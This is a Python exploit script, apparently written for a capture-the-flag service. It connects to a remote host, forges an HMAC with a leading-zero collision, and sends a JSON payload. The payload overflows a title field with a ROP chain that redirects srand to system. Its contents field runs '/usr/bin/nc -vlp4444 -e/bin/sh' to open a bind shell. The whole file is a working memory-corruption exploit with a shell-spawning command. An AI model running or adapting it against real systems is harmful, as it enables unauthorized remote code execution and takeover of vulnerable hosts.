#!/usr/bin/env python
import socket
import random
import json
from struct import *
import hmac
from hashlib import sha1

TCP_IP = '10.0.0.1'
TCP_PORT = 20003
BUFFER_SIZE = 1024

#0xb73e1fc0 <__srandom>
#0xb73ebb20 <__libc_system>
#difference: 0x9b60

#0x0804bcd4 R_386_JUMP_SLOT   srand
#0x08049b4f : pop eax ; add esp, 0x5c ; ret
#0x08048bf0 : pop ebx ; ret
#0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
#0x0804bcd4 - 0x5d5b04c4 = 0xaaa9b810 -> ebx
#eax = 0x00009b60
#gContents = 0x804bdf4
#08048f80 <exit@plt>:
#08048c20 <srand@plt>:


stack  = "\uf08b\u0408" # pop ebx; ret
stack += "\u10b8\ua9aa" # magic value to ebx
stack += "\u4f9b\u0408" # pop eax; add esp, 0x5c; ret
stack += "\u609b\u0000" # 0x00009b60
stack += "A"*0x5c; # 0x5c As
stack += "\ufe93\u0408" # add dword ptr [ebx + 0x5d5b04c4], eax ; ret
stack += "\u208c\u0408" # 08048c20 <srand@plt>
stack += "\u808f\u0408" # 08048f80 <exit@plt>
#stack += "ZZZZ"
stack += "\u2805\u6c09" # gContents <- /bin/nc
#stack += "\uf08b\u0408" # pop ebx; ret
#stack += "\ud4bc\u0408" # 0x0804bcd4 R_386_JUMP_SLOT   srand
#stack += "\u33a9\u0408" # 0x0804a933 : call dword ptr [ebx]
#stack += "\u90b5\u2c08" # gContents <- /bin/nc
#stack += "\u90b5\u2c08" # exit

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print "received data:", data
token = data[1:len(data)-2]
json = "\n"+json.dumps({'contents': "/"*600+"/usr/bin/nc -vlp4444 -e/bin/sh", 'title': "C"*127+"\u4141"+"C"*31+stack, 'serverip': '172.16.193.194'})
msg = token+chr(random.randint(0,255))+chr(random.randint(0,255))+chr(random.randint(0,255))+json
result = hmac.new(token, msg, sha1).digest()
while ord(result[0]) != 0 or ord(result[1]) != 0:
	msg = token+chr(random.randint(0,255))+chr(random.randint(0,255))+chr(random.randint(0,255))+json
	result = hmac.new(token, msg, sha1).digest()
print "[+] Collision found: "+hmac.new(token, msg, sha1).hexdigest()
s.send(msg)
s.close()

